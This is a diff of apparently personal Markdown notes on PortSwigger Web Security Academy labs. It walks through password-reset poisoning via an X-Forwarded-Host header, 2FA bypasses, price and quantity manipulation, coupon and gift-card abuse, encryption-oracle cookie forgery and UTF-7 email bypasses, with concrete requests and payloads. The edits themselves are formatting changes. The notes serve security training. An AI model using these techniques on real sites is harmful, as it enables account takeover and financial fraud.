@@ -482,27 +482,27 @@
     - Decode > carlos:26323c16d5f4dabff3bb136f2460a943
     - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943 > carlos:onceuponatime
 23. **Password reset** broken logic
-   - Perform password reset
+    - Perform password reset
      **Password reset url** in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
-   - Capture the password reset **traffic**
-     - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
-     - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
-   - Send to **repeater** and modify in below
-     - POST /forgot-password?temp-forgot-password-token=
-     - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
+    - Capture the password reset **traffic**
+      - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
+      - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
+    - Send to **repeater** and modify in below
+      - POST /forgot-password?temp-forgot-password-token=
+      - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
 25. Password reset poisoning via **middleware**
-   - **Perform password reset **  
-     Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
-   - Send to repeater and **perform password reset as victim user**   
-     POST /forgot-password   
-     add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
-   - Change in below and submit   
-     POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
-     Response: please check your email for a reset password link   
-   - Exploit server access log   
-     10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
-   - replace old token with new one and access the password reset url (change carlos password)   
-     https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
+    - **Perform password reset **  
+      Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
+    - Send to repeater and **perform password reset as victim user**   
+      POST /forgot-password   
+      add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
+    - Change in below and submit   
+      POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
+      Response: please check your email for a reset password link   
+    - Exploit server access log   
+      10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
+    - replace old token with new one and access the password reset url (change carlos password)   
+      https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
 26. **Password brute-force via password change**
      - Enter wrong current password (diff pair of new password): Current password is incorrect
      - Enter correct current password (diff pair of new password): New passwords do not match
@@ -541,100 +541,100 @@
 - Note any references to other code that uses each component   
 
 ### Business Logic Vulnerabilities Lab
-- Excessive trust in **client-side control**s
-  - The application **does not perform adequate server-side validation** of the price parameter. It trusts the value sent by the client without verifying it against a known, legitimate price from the database
-  - POST /cart
+1. Excessive trust in **client-side control**s
+   - The application **does not perform adequate server-side validation** of the price parameter. It trusts the value sent by the client without verifying it against a known, legitimate price from the database
+   - POST /cart
     productId=1&redir=PRODUCT&quantity=1&**price=10**    
-- **2FA broken logic**
-  - The application fails to properly bind the 2FA verification process to the original user's session   
-  - Login my account via 2FA
-  - Repeater: GET /login2 - change verify = victim user
-  - Intruder: POST /login2 - brute force mfa-code
-- **High-level logic** vulnerability
-  - The business logic does not account for the **possibility of negative quantities**, leading to incorrect calculations of total price and quantity. **Restrict user input to values that adhere to the business rule**.
-  - store credit $200
-  - Add one wish list item $1000
-  - Add one cheaper item $150 X (-6) quantity
-  - Amend the quantity to negative number
+2. **2FA broken logic**
+   - The application fails to properly bind the 2FA verification process to the original user's session   
+   - Login my account via 2FA
+   - Repeater: GET /login2 - change verify = victim user
+   - Intruder: POST /login2 - brute force mfa-code
+3. **High-level logic** vulnerability
+   - The business logic does not account for the **possibility of negative quantities**, leading to incorrect calculations of total price and quantity. **Restrict user input to values that adhere to the business rule**.
+   - store credit $200
+   - Add one wish list item $1000
+   - Add one cheaper item $150 X (-6) quantity
+   - Amend the quantity to negative number
     POST /cart
     productId=12&redir=PRODUCT&**quantity=-6**
-  - $1000 - $900 = total $100 place order
-- **Low-level logic** flaw
-  - The total price is calculated using an integer type that can only hold values up to a certain maximum (2,147,483,647 for a 32-bit signed integer). When the total price exceeds this value, it wraps around to the minimum negative value (-2,147,483,648) due to integer overflow.
-  - observing: Burp Intruder Sniper > **Payloads null payloads> continue indefinitely** > **$2,147,483,647** > wrapped around to the minimum value (**-2,147,483,648**)   
-  - Add Jacket to cart. Burp Intruder > Change quantity=99 > Payloads "Null payloads" > Generate 323 payloads > max concurrent 1 requests > -$-64060.96
-  - Burp Repeater > change qty to 47 > $-1221.96
-  - Add a cheaper item > increase quantity > until total reduce to <$100
-- Inconsistent handling of **exceptional input**
-  - **Site Map** > Right click target url > **Engagement Tools > Discover content** > click button "session is not running"
-  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
-  - **Email** truncated to **255 chrs**
-  - Register "[Long string chrs total of 255 including sudomain add]@dontwannacry.com.exploit-0a6500480408835d81947f9901c70002.exploit-server.net"
-- Inconsistent security controls
-  - **Trusted users won't always remain trustworthy**
-  - Use admin subdomain as email and login as admin type user
-  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
-  - Update email as hacker**@DontWannaCry.com**
-- Weak isolation on dual-use endpoint
-  - change password for admin (remove current-password param, and update username)
-  - POST /my-account/change-password
-  - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&~~scurrent-password=peter~~s&new-password-1=123456&new-password-2=123456
-  - modified: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&**username=administrator**&&new-password-1=123456&new-password-2=123456
-- **Password reset broken logic**
-  - **remove one parameter** at a time > deleting the name of the parameter as well as the **value**
-  - Users won't always supply mandatory input
-  - **temp-forgot-password-token**=~~sa5fk32fn68feb75ik9xp91sfoekxn11j~~s&username=wiener&new-password-1=123456&new-password-2=123456
-  - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456  
-- **2FA simple bypass**
-  - Users won't always follow the **intended sequence**
-  - skip to logged in page after 1FA
-- Insufficient workflow validation
-  - **Add Jacket** into cart
-    - POST /cart/checkout   
-  - **Error**
-    - GET **/cart?err=INSUFFICIENT_FUNDS**
-    - Not enough store credit for this purchase
-  - Send to **repeater** to a confirmation order page
-    - GET **/cart/order-confirmation?order-confirmed=true**
-- Authentication bypass via flawed state machine
-  - Login and intercept the next request
-    - POST /login HTTP/1.1
-    - csrf=5Y6EM5R6dxSayGitTEtdKdury3rwgN8X&username=wiener&password=peter   
-  - **Drop the next request** GET /role-selector
-    - browse to admin page, now defaulted as administrator
-- Flawed enforcement of business rules
-  - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
-- Infinite money logic flaw
-  > [!Burp traffic]   
-  > **add gift card** to cart   
-    POST /cart   
-    productId=2&redir=PRODUCT&quantity=1   
-  > **add coupon**   
-    POST /cart/coupon   
-    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&coupon=**SIGNUP30**      
-    Gift card code = **lHdlmj91Nu**   
-  > **place order**   
-    POST /cart/checkout   
-    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00   
-    GET /cart/order-confirmation?order-confirmed=true     
-  > **redeem gift card**   
-    POST /gift-card   
-    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&gift-card=lHdlmj91Nu   
-    GET /my-account   
-  - Settings > Project > Session > **Session handling rules panel, click "add"** > session handling rule editor appear
-  - Scope tab > select '**include all URLs**'
-  - Details tab > click "add" **run a micro** > click "add"
-    - POST /cart
-    - POST /cart/coupon
-    - POST /cart/checkout
-    - GET /cart/order-confirmation?order-confirmed=true > click configure item > **add a custom parameter** > name 'gift-card' > **highlight the gift card code** at the bottom of the response > Ok to go back Macro Editor
-    - POST /gift-card > click configure item > under **gift-card parameter handling** > select dropdown list **'derive from prior response**' > Ok to go back Macro Editor
-  - **Test Macro** > Ok to go back Burp
-  - Burp Intruder > **GET /my-account** > Sniper > **null payloads** > **generate 412 payloads** > max 1 concurrent request
-  - Store credit++ (Refresh the page)
-- Authentication bypass via **encryption oracle** **(SUPER HARD)**
-  - [Tutorial step by step](https://www.youtube.com/watch?v=62spVp-GVPI&t=1s)
-  - Stay logged in and post a comment with invalid email to observe encrypted cookies
+   - $1000 - $900 = total $100 place order
+4. **Low-level logic** flaw
+   - The total price is calculated using an integer type that can only hold values up to a certain maximum (2,147,483,647 for a 32-bit signed integer). When the total price exceeds this value, it wraps around to the minimum negative value (-2,147,483,648) due to integer overflow.
+   - observing: Burp Intruder Sniper > **Payloads null payloads> continue indefinitely** > **$2,147,483,647** > wrapped around to the minimum value (**-2,147,483,648**)   
+   - Add Jacket to cart. Burp Intruder > Change quantity=99 > Payloads "Null payloads" > Generate 323 payloads > max concurrent 1 requests > -$-64060.96
+   - Burp Repeater > change qty to 47 > $-1221.96
+   - Add a cheaper item > increase quantity > until total reduce to <$100
+5. Inconsistent handling of **exceptional input**
+   - **Site Map** > Right click target url > **Engagement Tools > Discover content** > click button "session is not running"
+   - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
+   - **Email** truncated to **255 chrs**
+   - Register "[Long string chrs total of 255 including sudomain add]@dontwannacry.com.exploit-0a6500480408835d81947f9901c70002.exploit-server.net"
+6. Inconsistent security controls
+   - **Trusted users won't always remain trustworthy**
+   - Use admin subdomain as email and login as admin type user
+   - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
+   - Update email as hacker**@DontWannaCry.com**
+7. Weak isolation on dual-use endpoint
+   - change password for admin (remove current-password param, and update username)
+   - POST /my-account/change-password
+   - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&~~scurrent-password=peter~~s&new-password-1=123456&new-password-2=123456
+   - modified: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&**username=administrator**&&new-password-1=123456&new-password-2=123456
+8. **Password reset broken logic**
+   - **remove one parameter** at a time > deleting the name of the parameter as well as the **value**
+   - Users won't always supply mandatory input
+   - **temp-forgot-password-token**=~~sa5fk32fn68feb75ik9xp91sfoekxn11j~~s&username=wiener&new-password-1=123456&new-password-2=123456
+   - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456  
+9. **2FA simple bypass**
+   - Users won't always follow the **intended sequence**
+   - skip to logged in page after 1FA
+10. **Insufficient workflow** validation
+    - **Add Jacket** into cart
+      - POST /cart/checkout   
+    - **Error**
+      - GET **/cart?err=INSUFFICIENT_FUNDS**
+      - Not enough store credit for this purchase
+    - Send to **repeater** to a confirmation order page
+      - GET **/cart/order-confirmation?order-confirmed=true**
+11. **Authentication bypass via flawed** state machine
+    - Login and intercept the next request
+      - POST /login HTTP/1.1
+      - csrf=5Y6EM5R6dxSayGitTEtdKdury3rwgN8X&username=wiener&password=peter   
+    - **Drop the next request** GET /role-selector
+      - browse to admin page, now defaulted as administrator
+12. Flawed enforcement of **business rules**
+    - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
+13. **Infinite money logic** flaw
+    > [!Burp traffic]   
+    > **add gift card** to cart   
+      POST /cart   
+      productId=2&redir=PRODUCT&quantity=1   
+    > **add coupon**   
+      POST /cart/coupon   
+      csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&coupon=**SIGNUP30**      
+      Gift card code = **lHdlmj91Nu**   
+    > **place order**   
+      POST /cart/checkout   
+      csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00   
+      GET /cart/order-confirmation?order-confirmed=true     
+    > **redeem gift card**   
+      POST /gift-card   
+      csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&gift-card=lHdlmj91Nu   
+      GET /my-account   
+    - Settings > Project > Session > **Session handling rules panel, click "add"** > session handling rule editor appear
+    - Scope tab > select '**include all URLs**'
+    - Details tab > click "add" **run a micro** > click "add"
+     - POST /cart
+     - POST /cart/coupon
+     - POST /cart/checkout
+     - GET /cart/order-confirmation?order-confirmed=true > click configure item > **add a custom parameter** > name 'gift-card' > **highlight the gift card code** at the bottom of the response > Ok to go back Macro Editor
+     - POST /gift-card > click configure item > under **gift-card parameter handling** > select dropdown list **'derive from prior response**' > Ok to go back Macro Editor
+    - **Test Macro** > Ok to go back Burp
+    - Burp Intruder > **GET /my-account** > Sniper > **null payloads** > **generate 412 payloads** > max 1 concurrent request
+    - Store credit++ (Refresh the page)
+14. Authentication bypass via **encryption oracle** **(SUPER HARD)**
+    - [Tutorial step by step](https://www.youtube.com/watch?v=62spVp-GVPI&t=1s)
+    - Stay logged in and post a comment with invalid email to observe encrypted cookies
     ```
     Request
     POST /post/comment   
@@ -646,12 +646,12 @@
     Set-Cookie: **notification=7XpfTWmxSzTjCp30OO0KfLmzXaTvnJgSd8%2bOZNjIlX5xQdyGRoVrdRJSdzta%2bAJr**;
     Body: Invalid email address: hh.hacker.com
     ```
-  - Encrypt repeater: POST /post/comment > stay-logged-in
-  - Decrypt repeater: GET /post?postId=4 > amend notification cookie > response
-  - Create and manipulate cookies to bypass encryption prefixes
-    - copy Encrypt (stay-logged-in) and replace to Decrypt (notification) > decrypt repeater send > response found "wiener:1720796160463" > copy the timestamp
-    - modify the email param in **Encrypt repeater**: email=**administrator:1720796160463** > send > copy the notification cookie in response
-    - replace to **Decrypt** (notification) > send > response "Invalid email address: administrator:1720796160463"   (First 23 bytes prefix - "Invalid email address: ")   
+    - Encrypt repeater: POST /post/comment > stay-logged-in
+    - Decrypt repeater: GET /post?postId=4 > amend notification cookie > response
+    - Create and manipulate cookies to bypass encryption prefixes
+      - copy Encrypt (stay-logged-in) and replace to Decrypt (notification) > decrypt repeater send > response found "wiener:1720796160463" > copy the timestamp
+      - modify the email param in **Encrypt repeater**: email=**administrator:1720796160463** > send > copy the notification cookie in response
+      - replace to **Decrypt** (notification) > send > response "Invalid email address: administrator:1720796160463"   (First 23 bytes prefix - "Invalid email address: ")   
 
     - **Encrypt** (stay-logged-in) > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 23 bytes > encode as base 64 > encode as url > copy the value
     - replace to **Decrypt** (notification) > send > response error "Input length must be multiple of 16 when decrypting with padded cipher"  (23 bytes prefix + 9 chrs = 32 + user:timestamp)
@@ -665,15 +665,15 @@
       Cookie: stay-logged-in=%52%72%76%64%79%4c%51%74%49%67%59%41%2b%58%65%5a%37%6d%4e%33%4e%62%64%73%63%48%52%2f%61%34%49%4a%54%41%4d%74%39%38%6a%79%6e%4f%59%3d;
       ```
     - Gain access as an admin and perform the required action
-  - Bypassing access controls using **email address parsing discrepancies**
-    - Investigate encoding discrepancies (Register account)
-      - #1 hello@hacker.com > "Only emails with the ginandjuice.shop domain are allowed"
-      - #2 abcfoo@ginandjuice.shop (abc Q encoding) > =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
-      - #3 UTF-8 encoded  > =?utf-8?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
-      - #4 UTF-7 encoded > =?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop > Register successfully  
-    - Exploit the vulnerability using UTF-7
-      - =?utf-7?q?attacker&AEA-exploit-0aa5000004a190348123f6f9016b004a.exploit-server.net&ACA-?=@ginandjuice.shop > email received
-      - This is the string attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop, with the @ symbol and space encoded in UTF-7.
+  15. Bypassing access controls using **email address parsing discrepancies**
+      - Investigate encoding discrepancies (Register account)
+        - #1 hello@hacker.com > "Only emails with the ginandjuice.shop domain are allowed"
+        - #2 abcfoo@ginandjuice.shop (abc Q encoding) > =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
+        - #3 UTF-8 encoded  > =?utf-8?q?=61=62=63?=foo@ginandjuice.shop > "Registration blocked for security reasons"
+        - #4 UTF-7 encoded > =?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop > Register successfully  
+      - Exploit the vulnerability using UTF-7
+        - =?utf-7?q?attacker&AEA-exploit-0aa5000004a190348123f6f9016b004a.exploit-server.net&ACA-?=@ginandjuice.shop > email received
+        - This is the string attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop, with the @ symbol and space encoded in UTF-7.
     
 ## Command Injection
 **How to test**
